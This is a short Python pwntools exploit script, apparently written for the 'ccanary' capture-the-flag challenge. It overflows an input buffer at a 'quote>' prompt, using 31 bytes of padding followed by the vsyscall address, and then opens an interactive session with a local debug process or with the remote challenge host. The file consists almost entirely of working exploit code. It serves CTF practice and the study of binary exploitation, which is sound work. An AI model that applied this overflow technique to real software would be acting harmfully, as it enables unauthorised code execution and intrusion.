#!/usr/bin/python

from pwn import *
import sys

remote_ip, port = '7b00000028603bb12884ac32-ccanary.challenge.master.allesctf.net', 31337 
binary = './ccanary'
brkpts = '''
b main
c
b quotegets
c
'''

elf = ELF("ccanary")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "debug"
# context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

uu64 = lambda a: u64(a.ljust(8,"\x00"))

if len(sys.argv) > 1:
    io = remote(remote_ip, port, ssl = True)
    context.noptrace = True

else:
    # io = process(binary)
    io = gdb.debug(binary, brkpts)

if __name__ == "__main__":
    payload = "a"*31 + p64(0xffffffffff600000) + p64(0x1)
    sla("quote> ", payload)
    # io.shutdown()
    io.interactive()